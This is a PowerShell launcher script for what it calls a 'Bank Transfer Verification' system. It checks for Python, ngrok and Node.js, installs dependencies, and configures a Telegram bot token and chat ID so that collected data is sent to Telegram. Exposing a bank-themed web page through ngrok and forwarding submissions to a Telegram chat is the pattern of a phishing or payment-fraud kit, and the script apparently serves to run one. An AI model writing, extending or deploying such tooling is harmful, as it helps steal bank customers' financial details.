# Bank Transfer Verification Launcher - PowerShell Version

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  BANK TRANSFER VERIFICATION LAUNCHER" -ForegroundColor Yellow
Write-Host "  100% FREE - Python + Ngrok + Next.js" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# Check Python
Write-Host "[1] Checking Python..." -ForegroundColor Gray
try {
    $pythonVersion = python --version 2>&1
    Write-Host "✅ $pythonVersion" -ForegroundColor Green
} catch {
    Write-Host "❌ Python not found. Please install Python 3.8+" -ForegroundColor Red
    Write-Host "Download from: https://www.python.org/downloads/" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit
}

Write-Host ""

# Check Ngrok
Write-Host "[2] Checking Ngrok..." -ForegroundColor Gray
try {
    $ngrokVersion = ngrok --version 2>&1
    Write-Host "✅ Ngrok found" -ForegroundColor Green
} catch {
    Write-Host "⚠️  Ngrok not found in PATH." -ForegroundColor Yellow
    Write-Host "Please install ngrok from: https://ngrok.com/download" -ForegroundColor Yellow
    Write-Host "OR install via: choco install ngrok" -ForegroundColor Yellow
    Write-Host "OR: npm install -g ngrok" -ForegroundColor Yellow
    Write-Host ""
    $continue = Read-Host "Continue without ngrok? (y/n)"
    if ($continue -notmatch "^[yY]$") {
        exit
    }
}

Write-Host ""

# Check Node.js
Write-Host "[3] Checking Node.js..." -ForegroundColor Gray
try {
    $nodeVersion = node --version 2>&1
    Write-Host "✅ Node.js $nodeVersion" -ForegroundColor Green
} catch {
    Write-Host "❌ Node.js not found. Please install Node.js" -ForegroundColor Red
    Write-Host "Download from: https://nodejs.org/" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit
}

Write-Host ""

# Check dependencies
Write-Host "[4] Checking dependencies..." -ForegroundColor Gray
if (-not (Test-Path "node_modules")) {
    Write-Host "⚠️  node_modules not found. Installing..." -ForegroundColor Yellow
    npm install
} else {
    Write-Host "✅ Node.js dependencies found" -ForegroundColor Green
}

Write-Host ""

# Check Python dependencies
Write-Host "[5] Installing Python dependencies..." -ForegroundColor Gray
pip install -r requirements.txt --quiet
Write-Host "✅ Python dependencies installed" -ForegroundColor Green

Write-Host ""

# Check Telegram config
Write-Host "[6] Checking Telegram configuration..." -ForegroundColor Gray
if (Test-Path ".env.local") {
    Write-Host "✅ .env.local found" -ForegroundColor Green
} else {
    Write-Host "⚠️  .env.local not found" -ForegroundColor Yellow
    Write-Host "   Data will not be sent to Telegram" -ForegroundColor Yellow
    Write-Host "   Create .env.local with TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  🚀 STARTING SYSTEM..." -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# Start the launcher
python launcher.py

Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  System stopped." -ForegroundColor Gray
Write-Host "============================================" -ForegroundColor Cyan
Read-Host "Press Enter to exit"